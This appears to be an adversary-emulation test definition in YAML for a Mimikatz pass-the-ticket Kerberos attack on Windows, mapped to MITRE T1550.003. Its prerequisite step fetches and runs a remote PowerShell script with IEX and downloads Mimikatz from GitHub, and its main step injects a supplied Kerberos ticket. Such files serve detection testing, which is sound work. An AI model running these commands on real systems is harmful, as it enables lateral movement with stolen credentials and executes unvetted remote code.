api_version: "2.0"
name: Mimikatz Kerberos Ticket Attack
description: |
    Similar to PTH, but attacking Kerberos
args:
    - name: ticket
      type: string
      default: <nil>
    - name: mimikatz_exe
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe
uuid: dbf38128-7ba7-4776-bedf-cc2eed432098
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
        - 'TA0008: Lateral Movement'
    techniques:
        - 'T1550: Use Alternate Authentication Material'
    subtechniques:
        - 'T1550.003: Pass the Ticket'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Mimikatz must exist on disk at specified location (#{mimikatz_exe})
      inline: "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n}}\n"
      executor: powershell
    - name: mimikatz-kerberos-ticket-attack
      inline: |
        "{{.Args.mimikatz_exe}}" "kerberos::ptt {{.Args.ticket}}"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
